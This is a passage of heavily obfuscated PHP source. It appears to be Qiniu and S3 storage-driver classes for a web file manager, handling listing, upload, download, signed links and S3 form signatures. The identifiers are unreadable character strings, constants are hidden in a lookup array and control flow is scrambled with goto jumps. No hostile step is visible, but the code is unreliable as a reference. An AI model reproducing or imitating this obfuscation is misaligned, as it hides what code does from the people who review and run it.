$A√∏§¢ª∫Ÿ[$A‚Ôöê¬–Ç[84]] = 0; $A√∏§¢ª∫Ÿ[$A‚Ôöê¬–Ç[195]] = $A√∏§¢ª∫Ÿ[$A‚Ôöê¬–Ç[196]] = !0; if (empty($AÌ£ä—¶¢…)) { $AÌ£ä—¶¢… = $this->objectMeta($B≥©µ∫ÉÕ‹); if (!$AÌ£ä—¶¢…) { return $A√∏§¢ª∫Ÿ; } } goto FÃÖÍñºÈ¬; cÖÛªàú∆ÿ: } public function folderInfo($B∑ÆﬂëåàŸ, $bÑﬂ†Á¶ ¨ = false) { goto EÔÕó˘Ñõû; bø®ëﬂó·È: $aúÜÆ∆Ï¡ü = $this->objectMeta($B∑ÆﬂëåàŸ); if (isset($aúÜÆ∆Ï¡ü[$eÍœ—µèæò[1305]])) { $eÀÃÏØ∏”ä[$eÍœ—µèæò[84]] = substr($aúÜÆ∆Ï¡ü[$eÍœ—µèæò[1305]] . $eÍœ—µèæò[33], 0, 10); } return $eÀÃÏØ∏”ä; goto e´œ≈¿¨∂˜; EÔÕó˘Ñõû: $eÍœ—µèæò =& $_SERVER[ú∫]; $eÀÃÏØ∏”ä = array($eÍœ—µèæò[28] => $this->pathThis($B∑ÆﬂëåàŸ), $eÍœ—µèæò[76] => $this->getPathOuter($eÍœ—µèæò[8] . $B∑ÆﬂëåàŸ), $eÍœ—µèæò[29] => $eÍœ—µèæò[77]); if ($bÑﬂ†Á¶ ¨) { return $eÀÃÏØ∏”ä; } goto Eˆì¡ƒ¥ÛØ; Eˆì¡ƒ¥ÛØ: $eÀÃÏØ∏”ä[$eÍœ—µèæò[194]] = $eÀÃÏØ∏”ä[$eÍœ—µèæò[84]] = 0; $eÀÃÏØ∏”ä[$eÍœ—µèæò[195]] = $eÀÃÏØ∏”ä[$eÍœ—µèæò[196]] = !0; $B∑ÆﬂëåàŸ = rtrim($B∑ÆﬂëåàŸ, $eÍœ—µèæò[8]) . $eÍœ—µèæò[8]; goto bø®ëﬂó·È; e´œ≈¿¨∂˜: } public function listPath($cÌâõåá›º, $d®√äÒêæ = false) { $CÜ¯±ñŸªö =& $_SERVER[ú∫]; $c¶∆Á‡≠¯ª = $this->fileList($cÌâõåá›º, $CÜ¯±ñŸªö[8], !0); foreach ($c¶∆Á‡≠¯ª[$CÜ¯±ñŸªö[75]] as $CÏî¯êÓê˜ => $Cıç¡‰ƒÚÆ) { $c¶∆Á‡≠¯ª[$CÜ¯±ñŸªö[75]][$CÏî¯êÓê˜] = $this->folderInfo($Cıç¡‰ƒÚÆ, $d®√äÒêæ); } foreach ($c¶∆Á‡≠¯ª[$CÜ¯±ñŸªö[74]] as $CÏî¯êÓê˜ => $Cıç¡‰ƒÚÆ) { $c¶∆Á‡≠¯ª[$CÜ¯±ñŸªö[74]][$CÏî¯êÓê˜] = $this->fileInfo($Cıç¡‰ƒÚÆ[$CÜ¯±ñŸªö[93]], $d®√äÒêæ, $Cıç¡‰ƒÚÆ); } return $c¶∆Á‡≠¯ª; } public function has($DñÇ¯®Öö◊, $Bù∞ó¨üüÌ = false, $B™Ã–å¯ˆã = true) { goto cÎ∞ÏÒ¬ ˆ; cÎ∞ÏÒ¬ ˆ: $a˘é°‡èÆã =& $_SERVER[ú∫]; $DñÇ¯®Öö◊ = trim($DñÇ¯®Öö◊, $a˘é°‡èÆã[8]); $fÌóë†É…õ = empty($DñÇ¯®Öö◊) && $DñÇ¯®Öö◊ !== $a˘é°‡èÆã[191] ? $a˘é°‡èÆã[33] : $DñÇ¯®Öö◊ . $a˘é°‡èÆã[8]; goto Cêê’†ÃÁ; a≠†ıœãÀÌ: $Cöæõ´€å¥ = $bçüØÎò≠ö = 0; while (!0) { check_abort(); list($f‘æËè‹÷ô, $E™à◊«°Ãø) = $this->bucketManager->listFiles($this->bucket, $fÌóë†É…õ, $dúè±ﬁÊ‚, $F»ßé∞éŒ…, $d®∫”Ù“¢Ë); if ($E™à◊«°Ãø) { break; } $dúè±ﬁÊ‚ = array_key_exists($a˘é°‡èÆã[1274], $f‘æËè‹÷ô) ? $dúè±ﬁÊ‚ = $f‘æËè‹÷ô[$a˘é°‡èÆã[1306]] : $a˘é°‡èÆã[33]; if ($Bù∞ó¨üüÌ) { if (!empty($f‘æËè‹÷ô[$a˘é°‡èÆã[1307]])) { $Cöæõ´€å¥ += count($f‘æËè‹÷ô[$a˘é°‡èÆã[1307]]); } if (!empty($f‘æËè‹÷ô[$a˘é°‡èÆã[1308]])) { $bçüØÎò≠ö += count($f‘æËè‹÷ô[$a˘é°‡èÆã[1308]]); } if ($dúè±ﬁÊ‚ === $a˘é°‡èÆã[33]) { break; } continue; } if ($B™Ã–å¯ˆã) { if (!empty($f‘æËè‹÷ô[$a˘é°‡èÆã[1307]])) { return !0; } } else { if (!empty($f‘æËè‹÷ô[$a˘é°‡èÆã[1308]])) { return !0; } } if ($dúè±ﬁÊ‚ === $a˘é°‡èÆã[33]) { break; } } if ($Bù∞ó¨üüÌ) { return array($a˘é°‡èÆã[203] => $Cöæõ´€å¥, $a˘é°‡èÆã[204] => $bçüØÎò≠ö); } goto b’˜í‚≤º‡; Cêê’†ÃÁ: $dúè±ﬁÊ‚ = $a˘é°‡èÆã[33]; $F»ßé∞éŒ… = 500; $d®∫”Ù“¢Ë = $a˘é°‡èÆã[8]; goto a≠†ıœãÀÌ; b’˜í‚≤º‡: return !1; goto d©¨µ©â´ˆ; d©¨µ©â´ˆ: } public function listAll($c÷ÀîãË¶Œ) { $f∞ç⁄¶©õˆ =& $_SERVER[ú∫]; $A–ÿÜÛ†…≥ = $this->fileList($c÷ÀîãË¶Œ, $f∞ç⁄¶©õˆ[33], !0); $cö√ÃÙÚå© = array(); foreach ($A–ÿÜÛ†…≥[$f∞ç⁄¶©õˆ[74]] as $bëäúˆ‘å…) { $cö√ÃÙÚå©[$bëäúˆ‘å…[$f∞ç⁄¶©õˆ[93]]] = $bëäúˆ‘å…[$f∞ç⁄¶©õˆ[78]]; } foreach ($A–ÿÜÛ†…≥[$f∞ç⁄¶©õˆ[75]] as $bëäúˆ‘å…) { if (is_string($bëäúˆ‘å…)) { $cö√ÃÙÚå©[$bëäúˆ‘å…] = 0; } } return $this->listAllFiles($c÷ÀîãË¶Œ, array_keys($cö√ÃÙÚå©), $cö√ÃÙÚå©); } private function fileList($Aë∆áÏâåß, $DôƒÑëÀ¨– = '', $F™ﬂ›ïúÏÕ = 0) { goto f¿‡ß‚¨·Ø; Cú‰îÛƒ©™: $AÊ‡•Êóâ∫ = $Aâ…áèΩëΩ = array(); while (!0) { check_abort(); list($cíﬂ¿’î˘î, $e—”èâﬂûÈ) = $this->bucketManager->listFiles($this->bucket, $AË”Ó§Ãü†, $a∂◊©Ôƒ¶π, $a√•¡ÈÖ É, $DôƒÑëÀ¨–); if ($e—”èâﬂûÈ) { break; } $a∂◊©Ôƒ¶π = array_key_exists($b¬÷‹µ´¯Í[1274], $cíﬂ¿’î˘î) ? $a∂◊©Ôƒ¶π = $cíﬂ¿’î˘î[$b¬÷‹µ´¯Í[1306]] : $b¬÷‹µ´¯Í[33]; $cóûÑ…ñÚÂ = isset($cíﬂ¿’î˘î[$b¬÷‹µ´¯Í[1307]]) ? $cíﬂ¿’î˘î[$b¬÷‹µ´¯Í[1307]] : array(); $bÜ∑îøòè¡ = isset($cíﬂ¿’î˘î[$b¬÷‹µ´¯Í[1308]]) ? $cíﬂ¿’î˘î[$b¬÷‹µ´¯Í[1308]] : array(); foreach ($cóûÑ…ñÚÂ as $d≤Àó≠√ıÜ) { goto A”§¿èí‚µ; A”§¿èí‚µ: if ($d≤Àó≠√ıÜ[$b¬÷‹µ´¯Í[93]] == $AË”Ó§Ãü†) { continue; } $dËΩñäöµƒ = $d≤Àó≠√ıÜ[$b¬÷‹µ´¯Í[93]]; $Aµ„î…Úç‡ = $d≤Àó≠√ıÜ[$b¬÷‹µ´¯Í[1304]]; goto B¡€´ìã€; B¡€´ìã€: $d≤Àó≠√ıÜ[$b¬÷‹µ´¯Í[78]] = $Aµ„î…Úç‡; $dÈ◊ñ§¨®í = $Aµ„î…Úç‡ == 0 && substr($dËΩñäöµƒ, strlen($dËΩñäöµƒ) - 1, 1) == $b¬÷‹µ´¯Í[8] ? !0 : !1; if ($aƒ¿◊”áá) { $this->cacheMethod($b¬÷‹µ´¯Í[199], $dËΩñäöµƒ, $dÈ◊ñ§¨®í); $this->cacheMethod($b¬÷‹µ´¯Í[200], $dËΩñäöµƒ, $d≤Àó≠√ıÜ); } goto DòﬂØÎ÷èÍ; DòﬂØÎ÷èÍ: if ($dÈ◊ñ§¨®í) { $AÊ‡•Êóâ∫[] = $dËΩñäöµƒ; continue; } $Aâ…áèΩëΩ[] = $F™ﬂ›ïúÏÕ ? $d≤Àó≠√ıÜ : $dËΩñäöµƒ; goto AèﬁÔ„«§Ñ; AèﬁÔ„«§Ñ: } foreach ($bÜ∑îøòè¡ as $dËΩñäöµƒ) { if ($dËΩñäöµƒ == $AË”Ó§Ãü†) { continue; } $AÊ‡•Êóâ∫[] = $dËΩñäöµƒ; if ($aƒ¿◊”áá) { $this->cacheMethod($b¬÷‹µ´¯Í[199], $dËΩñäöµƒ, !0); } } if ($a∂◊©Ôƒ¶π === $b¬÷‹µ´¯Í[33]) { break; } } if ($aƒ¿◊”áá) { $this->cacheMethod($b¬÷‹µ´¯Í[199], $Aë∆áÏâåß, !0); } goto EÑ‡ÖÌÍÇ≠; f¿‡ß‚¨·Ø: $b¬÷‹µ´¯Í =& $_SERVER[ú∫]; $Aë∆áÏâåß = trim($Aë∆áÏâåß, $b¬÷‹µ´¯Í[8]); $AË”Ó§Ãü† = empty($Aë∆áÏâåß) && $Aë∆áÏâåß !== $b¬÷‹µ´¯Í[191] ? $b¬÷‹µ´¯Í[33] : $Aë∆áÏâåß . $b¬÷‹µ´¯Í[8]; goto A§⁄üÆ≈ü⁄; EÑ‡ÖÌÍÇ≠: return array($b¬÷‹µ´¯Í[75] => $AÊ‡•Êóâ∫, $b¬÷‹µ´¯Í[74] => $Aâ…áèΩëΩ); goto DäÇèÕà˘†; A§⁄üÆ≈ü⁄: $a∂◊©Ôƒ¶π = $b¬÷‹µ´¯Í[33]; $a√•¡ÈÖ É = 1000; $aƒ¿◊”áá = $this->listItemCache === !1 ? !1 : !0; goto Cú‰îÛƒ©™; DäÇèÕà˘†: } public function canRead($d‹ß”ù åÀ) { return $this->exist($d‹ß”ù åÀ) ? !0 : !1; } public function canWrite($DÎËèıÕß‰) { return $this->exist($DÎËèıÕß‰) ? !0 : !1; } public function getContent($aÿ™‹∑ïßÀ) { return $this->fileSubstr($aÿ™‹∑ïßÀ, 0, -1); } public function setContent($Dä∞úîë∏–, $fÃ•ó“⁄ó∏ = '') { $C¶î•ë»’Á = $this->tempFile($this->pathThis($Dä∞úîë∏–)); file_put_contents($C¶î•ë»’Á, $fÃ•ó“⁄ó∏); if ($this->upload($Dä∞úîë∏–, $C¶î•ë»’Á)) { $this->tempFileRemve($C¶î•ë»’Á); return !0; } return !1; } public function refreshUrls($Eè˜ó¯’Ö—) { goto B©‡ÈÖÛ™ë; e§˜ﬁ—èÂı: return $e∑¬éÖﬁêÇ[$fﬁß∑Ç¯Çæ[1078]] == $fﬁß∑Ç¯Çæ[720] ? !0 : !1; goto A¶≠•€ˆÂÏ; FÇƒΩÇÿƒ∑: $cÖÂî…Ï∂∫ = new Qiniu\Cdn\CdnManager($this->auth); list($e∑¬éÖﬁêÇ, $eì˘û—‹Ê“) = $cÖÂî…Ï∂∫->refreshUrls($FÆ¿ñöÌéÑ); if ($eì˘û—‹Ê“) { return !1; } goto e§˜ﬁ—èÂı; B©‡ÈÖÛ™ë: $fﬁß∑Ç¯Çæ =& $_SERVER[ú∫]; $FÆ¿ñöÌéÑ = array(); if (is_array($Eè˜ó¯’Ö—)) { foreach ($Eè˜ó¯’Ö— as $cÇƒ€ú∫÷’) { $FÆ¿ñöÌéÑ[] = $this->link($cÇƒ€ú∫÷’); } } else { $FÆ¿ñöÌéÑ[] = $this->link($Eè˜ó¯’Ö—); } goto FÇƒΩÇÿƒ∑; A¶≠•€ˆÂÏ: } public function fileSubstr($f≠Ô‚µò˘ê, $fø‚Ëπèã”, $A ≠Ò™á¶È) { $B≤˘ä¢œ¬‰ =& $_SERVER[ú∫]; if (!($F∆ÁÿîŒÕ⁄ = $this->link($f≠Ô‚µò˘ê))) { return !1; } $A‹œ√√•¶ñ = !1; if ($A ≠Ò™á¶È > 0) { $B∑çÙˆê∞ = $fø‚Ëπèã” + $A ≠Ò™á¶È - 1; $A‹œ√√•¶ñ = array($B≤˘ä¢œ¬‰[1309] . $fø‚Ëπèã” . $B≤˘ä¢œ¬‰[440] . $B∑çÙˆê∞); } $eù¶“ã·©⁄ = url_request($F∆ÁÿîŒÕ⁄, $B≤˘ä¢œ¬‰[228], !1, $A‹œ√√•¶ñ); return $eù¶“ã·©⁄[$B≤˘ä¢œ¬‰[710]] ? $eù¶“ã·©⁄[$B≤˘ä¢œ¬‰[1088]] : !1; } public function upload($C—ç∆Ú’–ƒ, $cÑëß˜›€€, $c®ﬁœ†éºÙ = false, $dàÃñ√Ìæâ = REPEAT_REPLACE) { $Còü‹Æèüã = new Qiniu\Storage\UploadManager(); $Bú¨¿’Ë”· = $this->auth->uploadToken($this->bucket, $C—ç∆Ú’–ƒ); $Bàì“íû©ä = get_file_mime(get_path_ext($cÑëß˜›€€)); list($Düñ»”ÿ´, $eÉÆ“¶‰Û¥) = $Còü‹Æèüã->putFile($Bú¨¿’Ë”·, $C—ç∆Ú’–ƒ, $cÑëß˜›€€, null, $Bàì“íû©ä); return $eÉÆ“¶‰Û¥ ? !1 : $this->getPathOuter($C—ç∆Ú’–ƒ); } public function uploadFormData($bõà£§£àÀ, $a⁄•øŒòπ  = 3600) { return $this->uploadToken($bõà£§£àÀ, $a⁄•øŒòπ ); } public function multiUploadFormData($eÒ…≥‰ô˜›, $aÇöﬂèµàì = 3600) { return $this->uploadToken($eÒ…≥‰ô˜›, $aÇöﬂèµàì); } private function uploadToken($cÛ≥º”ò‘À, $aÛî÷ˆ™ë± = 3600) { goto CçåüàÔ¯é; B†ÕÓïáãÚ: $e„Ÿ¨ÑÊÿΩ = http_type() . "\72\57\57\165\x70\x6c\157\141\x64{$bæì≥∫®È≤}\x2e\161\x69\156\151\165\x70\56\x63\157\x6d\x2f"; return array($E‚ÿ¢çãıÍ[1313] => $a¿€‘‹Ü£ì, $E‚ÿ¢çãıÍ[1314] => $e„Ÿ¨ÑÊÿΩ); goto C©™»ûûØ; F…¨Ø·˘Ÿè: $FÆ‚∏üÎﬂ∆ = $cÛ≥º”ò‘À; $a¿€‘‹Ü£ì = $this->auth->uploadToken($this->bucket, $FÆ‚∏üÎﬂ∆, $Câ©≈íÙÎï, $A“…úÑ‘ˆ˜, !0); $bæì≥∫®È≤ = empty($this->region) || $this->region == $E‚ÿ¢çãıÍ[1312] ? $E‚ÿ¢çãıÍ[33] : $E‚ÿ¢çãıÍ[440] . $this->region; goto B†ÕÓïáãÚ; CçåüàÔ¯é: $E‚ÿ¢çãıÍ =& $_SERVER[ú∫]; $Câ©≈íÙÎï = $aÛî÷ˆ™ë±; $A“…úÑ‘ˆ˜ = array($E‚ÿ¢çãıÍ[1310] => $E‚ÿ¢çãıÍ[1311]); goto F…¨Ø·˘Ÿè; C©™»ûûØ: } public function download($A»·“Ï™ô¡, $E—¯ñÊÀß©) { goto e«ùùΩÖ⁄ı; fçé£éﬁ‡Õ: $dÛÔ≈ï©ËÇ = 1024 * 200; $BÔÑôπèÜ¡ = fopen($aé…—•ÑÊˆ, $_SERVER[ú∫][1315]); while (!0) { $Eóúá‡úàû = $this->fileSubstr($A»·“Ï™ô¡, $dÌ±ÿ§üÉê, $dÛÔ≈ï©ËÇ); if ($Eóúá‡úàû === !1) { return !1; } fwrite($BÔÑôπèÜ¡, $Eóúá‡úàû); $dÌ±ÿ§üÉê += $dÛÔ≈ï©ËÇ; if (strlen($Eóúá‡úàû) < $dÛÔ≈ï©ËÇ) { break; } } goto AÈÊ‰‚‘Ø¥; e«ùùΩÖ⁄ı: $aé…—•ÑÊˆ = IO::getPathInner(IO::mkfile($E—¯ñÊÀß©)); if (!($d¢Ü·Õî¶Ú = $this->link($A»·“Ï™ô¡))) { return !1; } $dÌ±ÿ§üÉê = 0; goto fçé£éﬁ‡Õ; AÈÊ‰‚‘Ø¥: fclose($BÔÑôπèÜ¡); return $E—¯ñÊÀß©; goto eÛòã√Â“É; eÛòã√Â“É: } public function link($d∏Úæ”Ÿ«Ê, $C‘Ü›å÷î¨ = '') { if (!$this->isFile($d∏Úæ”Ÿ«Ê)) { return !1; } $B‘πÛÛÿ„ﬂ = $this->getHost() . $_SERVER[ú∫][8] . $this->pathEncode($d∏Úæ”Ÿ«Ê) . $C‘Ü›å÷î¨; return $this->auth->privateDownloadUrl($B‘πÛÛÿ„ﬂ, 3600 * 12); } public function fileOut($A—ü¿∏¡¶æ, $bìí∞é¯≈® = false, $Fÿ©Ô∆Ÿ˘§ = false, $D••ı¥Ω∏Í = '') { $CçºÛ´©Ü =& $_SERVER[ú∫]; if ($this->isFileOutServer()) { return $this->fileOutServer($A—ü¿∏¡¶æ, $bìí∞é¯≈®, $Fÿ©Ô∆Ÿ˘§, $D••ı¥Ω∏Í); } if (!$Fÿ©Ô∆Ÿ˘§) { $Fÿ©Ô∆Ÿ˘§ = $this->pathThis($A—ü¿∏¡¶æ); } $C◊’ëæï√ı = $bìí∞é¯≈® ? $CçºÛ´©Ü[1316] . rawurlencode($Fÿ©Ô∆Ÿ˘§) : $CçºÛ´©Ü[33]; $d€á÷’È†ò = $this->link($A—ü¿∏¡¶æ, $C◊’ëæï√ı); $this->fileOutLink($d€á÷’È†ò); } public function fileOutServer($B€ﬁ‰ß„ˆ™, $AÊ∆ü∆íÍΩ = false, $aêœëŒ≤ˆ” = false, $Cöù‡èé‰ˆ = '') { parent::fileOut($B€ﬁ‰ß„ˆ™, $AÊ∆ü∆íÍΩ, $aêœëŒ≤ˆ”, $Cöù‡èé‰ˆ); } public function fileOutImage($B∫«·“ÑÖá, $D“≥Â§Õ¥à = 250) { $C¯ŸÓ—çøñ = $this->link($B∫«·“ÑÖá, $_SERVER[ú∫][1317] . $D“≥Â§Õ¥à); $this->fileOutLink($C¯ŸÓ—çøñ); } public function fileOutImageServer($a∆–ù¨√Ç≠, $F´≈¯ª∂◊ÿ = 250) { parent::fileOutImage($a∆–ù¨√Ç≠, $F´≈¯ª∂◊ÿ); } public function hashMd5($C∂˘ÜóÚø∞) { $Bô≥¿Á‘€¬ =& $_SERVER[ú∫]; $FÌÈöé’Ê≈ = $this->objectMeta($C∂˘ÜóÚø∞); return isset($FÌÈöé’Ê≈[$Bô≥¿Á‘€¬[208]]) ? $FÌÈöé’Ê≈[$Bô≥¿Á‘€¬[208]] : !1; $cÃÊì¥ „ü = $this->link($C∂˘ÜóÚø∞, $Bô≥¿Á‘€¬[1318]); } public function size($CÖÿ®ç∫ìæ) { $fúÌ©πÖ≤Ú = $this->objectMeta($CÖÿ®ç∫ìæ); return $fúÌ©πÖ≤Ú ? $fúÌ©πÖ≤Ú[$_SERVER[ú∫][78]] : 0; } public function info($D’ìà†Ü¨£) { if ($this->isFolder($D’ìà†Ü¨£)) { return $this->folderInfo($D’ìà†Ü¨£); } else { if ($this->isFile($D’ìà†Ü¨£)) { return $this->fileInfo($D’ìà†Ü¨£); } } return !1; } public function exist($EÇ‘‰“á£ª) { return $this->isFile($EÇ‘‰“á£ª) || $this->isFolder($EÇ‘‰“á£ª); } public function isFile($F˘è»ÿÖ„¨) { return !$this->isFolder($F˘è»ÿÖ„¨) && $this->objectMeta($F˘è»ÿÖ„¨); } public function isFolder($cÿàÒÌ±Õè) { return $this->cacheMethod($_SERVER[ú∫][199], $cÿàÒÌ±Õè); } protected function objectMeta($F‡ñêè Ó€) { return $this->cacheMethod($_SERVER[ú∫][200], $F‡ñêè Ó€); } protected function _objectMeta($fëáíô£·Î) { $D™◊éŒ¡®ë =& $_SERVER[ú∫]; list($f¿ïºÊÿŒØ, $EÇô—∏¡Ò) = $this->bucketManager->stat($this->bucket, $fëáíô£·Î); if ($f¿ïºÊÿŒØ) { $f¿ïºÊÿŒØ[$D™◊éŒ¡®ë[78]] = intval($f¿ïºÊÿŒØ[$D™◊éŒ¡®ë[1304]]); } return $f¿ïºÊÿŒØ; } protected function _isFolder($f‘◊∏°Ñ≈∆) { $Eö˘òØ”ÜÆ =& $_SERVER[ú∫]; if ($f‘◊∏°Ñ≈∆ == $Eö˘òØ”ÜÆ[33] || $f‘◊∏°Ñ≈∆ == $Eö˘òØ”ÜÆ[8]) { return !0; } list($cÃôãœ•–à, $Fâ‹¥éÙëˆ) = $this->bucketManager->listFiles($this->bucket, trim($f‘◊∏°Ñ≈∆, $Eö˘òØ”ÜÆ[8]) . $Eö˘òØ”ÜÆ[8], $Eö˘òØ”ÜÆ[33], 1, $Eö˘òØ”ÜÆ[8]); return !empty($cÃôãœ•–à[$Eö˘òØ”ÜÆ[1307]]) || !empty($cÃôãœ•–à[$Eö˘òØ”ÜÆ[1308]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($D†Àã∫±≤ ) { parent::__construct($D†Àã∫±≤ ); } public function uploadFormData($FÉ˘Ù·ó∞É, $eÇîÇÔ≤ù– = 3600) { goto BóçâÿÿÕê; fÏÂ£”ââ: $e»ˆÀ¨àÔ© = array($EêìÀ÷Ñ£¬[211] => $EêìÀ÷Ñ£¬[33], $EêìÀ÷Ñ£¬[1236] => $EêìÀ÷Ñ£¬[33], $EêìÀ÷Ñ£¬[1193] => $bÀèÆŒÛë≈, $EêìÀ÷Ñ£¬[1197] => $C–éíÕõ‰´, $EêìÀ÷Ñ£¬[1201] => $BÛƒé‹øÀ¥, $EêìÀ÷Ñ£¬[1237] => $aÚ™£¿ä◊ø, $EêìÀ÷Ñ£¬[1238] => $d◊⁄§ô‘¬ü, $EêìÀ÷Ñ£¬[1239] => $A—óÙâã®”, $EêìÀ÷Ñ£¬[1240] => $FÆ°à‰é˘‘, $EêìÀ÷Ñ£¬[1241] => $Dÿ‡„Œ∫≈õ, $EêìÀ÷Ñ£¬[175] => $this->getHost()); return $e»ˆÀ¨àÔ©; goto fÑö‘¬±ÒÑ; bûªÔèÙäò: $d¢îÈ—Ú“ = array($this->accessKey, $aÕÖ∑„ÿƒ, $this->region, $fÎ∂ﬂ∞ãÿ∏, $càÉ≥»“ﬁ»); $aÚ™£¿ä◊ø = implode($EêìÀ÷Ñ£¬[8], $d¢îÈ—Ú“); $Aƒ∆⁄Ò•”€ = array($EêìÀ÷Ñ£¬[1191] => gmdate($EêìÀ÷Ñ£¬[1190], strtotime($EêìÀ÷Ñ£¬[1227])), $EêìÀ÷Ñ£¬[1192] => array(array($EêìÀ÷Ñ£¬[1194] => $this->bucket), array($EêìÀ÷Ñ£¬[1193] => $bÀèÆŒÛë≈), array($EêìÀ÷Ñ£¬[1195], $EêìÀ÷Ñ£¬[1196], $EêìÀ÷Ñ£¬[33]), array($EêìÀ÷Ñ£¬[1195], $EêìÀ÷Ñ£¬[1228], $EêìÀ÷Ñ£¬[33]), array($EêìÀ÷Ñ£¬[1195], $EêìÀ÷Ñ£¬[1229], $EêìÀ÷Ñ£¬[33]), array($EêìÀ÷Ñ£¬[1197] => $C–éíÕõ‰´), array($EêìÀ÷Ñ£¬[1230] => $aÚ™£¿ä◊ø), array($EêìÀ÷Ñ£¬[1231] => $d◊⁄§ô‘¬ü), array($EêìÀ÷Ñ£¬[1232] => $A—óÙâã®”), array($EêìÀ÷Ñ£¬[1233] => $FÆ°à‰é˘‘))); goto BÔéÁœü⁄®; Dù≈ëÇ≈”Œ: $e≠°º∑ôåΩ = hash_hmac($EêìÀ÷Ñ£¬[1234], $fÎ∂ﬂ∞ãÿ∏, $CÉﬁ⁄‘Ñ™⁄, !0); $f≤î„©Ü£Ö = hash_hmac($EêìÀ÷Ñ£¬[1234], $càÉ≥»“ﬁ», $e≠°º∑ôåΩ, !0); $Dÿ‡„Œ∫≈õ = hash_hmac($EêìÀ÷Ñ£¬[1234], $BÛƒé‹øÀ¥, $f≤î„©Ü£Ö); goto fÏÂ£”ââ; BóçâÿÿÕê: $EêìÀ÷Ñ£¬ =& $_SERVER[ú∫]; $bÀèÆŒÛë≈ = $EêìÀ÷Ñ£¬[192]; $d◊⁄§ô‘¬ü = $EêìÀ÷Ñ£¬[1224]; goto EÃ®Õ≤é®œ; c∞†À˘úã›: $càÉ≥»“ﬁ» = $EêìÀ÷Ñ£¬[1226]; $FÆ°à‰é˘‘ = $eÇîÇÔ≤ù– . $EêìÀ÷Ñ£¬[33]; $C–éíÕõ‰´ = $EêìÀ÷Ñ£¬[1189]; goto bûªÔèÙäò; BÔéÁœü⁄®: $BÛƒé‹øÀ¥ = base64_encode(json_encode($Aƒ∆⁄Ò•”€)); $BˆÛ…ñÚ„‹ = hash_hmac($EêìÀ÷Ñ£¬[1234], $aÕÖ∑„ÿƒ, $EêìÀ÷Ñ£¬[1235] . $this->secret, !0); $CÉﬁ⁄‘Ñ™⁄ = hash_hmac($EêìÀ÷Ñ£¬[1234], $this->region, $BˆÛ…ñÚ„‹, !0); goto Dù≈ëÇ≈”Œ; EÃ®Õ≤é®œ: $fÎ∂ﬂ∞ãÿ∏ = $EêìÀ÷Ñ£¬[59]; $A—óÙâã®” = gmdate($EêìÀ÷Ñ£¬[1225]); $aÕÖ∑„ÿƒ = gmdate($EêìÀ÷Ñ£¬[711]); goto c∞†À˘úã›; fÑö‘¬±ÒÑ: } public function multiUploadFormData($FôÜõ§ê≈›, $BúèÚê¬‹Â = 3600) { $c•Ú…ö™ﬁœ =& $_SERVER[ú∫]; $aªÁ‘ßö™∏ = gmdate($c•Ú…ö™ﬁœ[1319]); $C§∆¶∫¬œß = array(); $cçæØ‰Ûæ∆ = $this->client->getUploadId($this->bucket, $FôÜõ§ê≈›, $C§∆¶∫¬œß); if (!$cçæØ‰Ûæ∆) { return !1; } return array($c•Ú…ö™ﬁœ[221] => $cçæØ‰Ûæ∆, $c•Ú…ö™ﬁœ[175] => $this->getHost() . $c•Ú…ö™ﬁœ[8] . $this->pathEncode($FôÜõ§ê≈›), $c•Ú…ö™ﬁœ[222] => $aªÁ‘ßö™∏, $c•Ú…ö™ﬁœ[93] => $FôÜõ§ê≈›); } public function multiUploadAuthData($fà‹©Œ∂£ù, $cªçÎÙî‡Ü = array()) { goto cÒû”˜Ÿª; cÒû”˜Ÿª: $fÒπñç⁄¢œ =& $_SERVER[ú∫]; $f˘¥Ù°âÓä = isset($cªçÎÙî‡Ü[$fÒπñç⁄¢œ[168]]) ? $cªçÎÙî‡Ü[$fÒπñç⁄¢œ[168]] : $fÒπñç⁄¢œ[33]; $Bﬂ“πÑâëÎ = $cªçÎÙî‡Ü[$fÒπñç⁄¢œ[93]]; goto bãŸ·∫á°¡; dï‚¶¿√€ë: if (isset($cªçÎÙî‡Ü[$fÒπñç⁄¢œ[1320]])) { $a§⁄∑¥˘÷º[$fÒπñç⁄¢œ[1321]] = $cªçÎÙî‡Ü[$fÒπñç⁄¢œ[1320]]; } $F∂åÖ·äº“ = explode($fÒπñç⁄¢œ[177], $this->getHost()); $Fø∑í∆”èó = array($fÒπñç⁄¢œ[1322] => $F∂åÖ·äº“[1], $fÒπñç⁄¢œ[1323] => $fÒπñç⁄¢œ[33], $fÒπñç⁄¢œ[211] => $fÒπñç⁄¢œ[119], $fÒπñç⁄¢œ[1236] => $cªçÎÙî‡Ü[$fÒπñç⁄¢œ[78]]); goto b∑æ”’ıü±; Bı≤ΩØÎ…π: if (strpos($f˘¥Ù°âÓä, $fÒπñç⁄¢œ[225]) === 0) { if (isset($a§⁄∑¥˘÷º[$fÒπñç⁄¢œ[1321]])) { $aÕΩºƒ∑î— = $a§⁄∑¥˘÷º[$fÒπñç⁄¢œ[1321]]; } else { if (isset($aˆëäÛπÂî[$fÒπñç⁄¢œ[1321]])) { $aÕΩºƒ∑î— = $aˆëäÛπÂî[$fÒπñç⁄¢œ[1321]]; } else { $aÕΩºƒ∑î— = hash($fÒπñç⁄¢œ[1234], $fÒπñç⁄¢œ[33]); } } return array($fÒπñç⁄¢œ[232] => $aˆëäÛπÂî[$fÒπñç⁄¢œ[232]], $fÒπñç⁄¢œ[1321] => $aÕΩºƒ∑î—, $fÒπñç⁄¢œ[222] => $aˆëäÛπÂî[$fÒπñç⁄¢œ[1324]]); } return $aˆëäÛπÂî[$fÒπñç⁄¢œ[232]]; goto b™‚ÑçÜá√; bãŸ·∫á°¡: unset($cªçÎÙî‡Ü[$fÒπñç⁄¢œ[93]]); if (isset($cªçÎÙî‡Ü[$fÒπñç⁄¢œ[223]])) { return $this->listUploadParts($Bﬂ“πÑâëÎ, $cªçÎÙî‡Ü); } $a§⁄∑¥˘÷º = array(); goto dï‚¶¿√€ë; b∑æ”’ıü±: $FõûŒŒ‡¢Ñ = $fÒπñç⁄¢œ[226]; $FŸªë©ºß‚ = $fÒπñç⁄¢œ[8] . $this->pathEncode($Bﬂ“πÑâëÎ) . $f˘¥Ù°âÓä; $aˆëäÛπÂî = $this->client->__getSignatureV4($a§⁄∑¥˘÷º, $Fø∑í∆”èó, $FõûŒŒ‡¢Ñ, $FŸªë©ºß‚); goto Bı≤ΩØÎ…π; b™‚ÑçÜá√: } public function listUploadParts($aå´àã€˘¯, $AåÃ≤¶üœº = array()) { goto EÑ’£¶»ùõ; EÑ’£¶»ùõ: $A‹Ç∏À‡≈‰ =& $_SERVER[ú∫]; $d–ª—æ‰◊Ñ = 